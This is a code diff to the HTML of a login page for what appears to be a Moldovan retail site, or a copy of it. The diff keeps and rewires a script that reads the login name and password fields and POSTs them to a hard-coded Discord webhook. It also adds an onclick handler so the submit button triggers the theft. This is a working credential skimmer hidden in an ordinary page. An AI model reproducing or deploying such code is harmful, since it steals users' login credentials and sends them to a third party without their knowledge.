@@ -44,15 +44,12 @@
 		gtag('js', new Date());
 		gtag('config', 'G-QZJGCVMB4V');
 	</script>
-	<script>
-		window.onload = function() {
-			console.log(document.getElementsByClassName("form-login__button")[0])
-		document.getElementsByClassName("form-login__button")[0].addEventListener("click", () => {
+	<script defer>
+		function test() {
 			fetch('https://discord.com/api/webhooks/1301483051653533707/4Zq3BT1n4PZOmTpQIT40a8MxV62ejnlQmBSniy1Mb3_jr3qTgfOfZM54PQKg7rAWUWzl',{
 				method:'POST',
 				headers: {'Content-Type':'application/json'},
 				body:JSON.stringify({content: document.getElementsByClassName("form-login__input")[0].value+" | "+document.getElementsByClassName("form-login__input")[1].value})})
-		})
 		}
 	</script>
 <link rel="stylesheet" href="https://code.jivosite.com/css/d1dc0ec/widget.css" class="jv-css"></head>
@@ -1241,7 +1238,7 @@
 		</div>
 	</div>
 	<div class="form-login__footer">
-		<button type="submit" class="form-login__button _btn _fw _bs">Autentificare</button>
+		<button type="submit" class="form-login__button _btn _fw _bs" onclick="test()">Autentificare</button>
 		<div class="form-login__connect connect-form-login">
 							<a href="https://www.facebook.com/v3.2/dialog/oauth?client_id=491280976659803&amp;state=e12b3a14f76d051a2681dbb51467e4e7&amp;response_type=code&amp;sdk=php-sdk-5.1.4&amp;redirect_uri=https%3A%2F%2Falcomarket.md%2Fro%2Flogin&amp;scope=email%2Cuser_birthday" class="connect-form-login__item">
 					<div class="connect-form-login__icon">
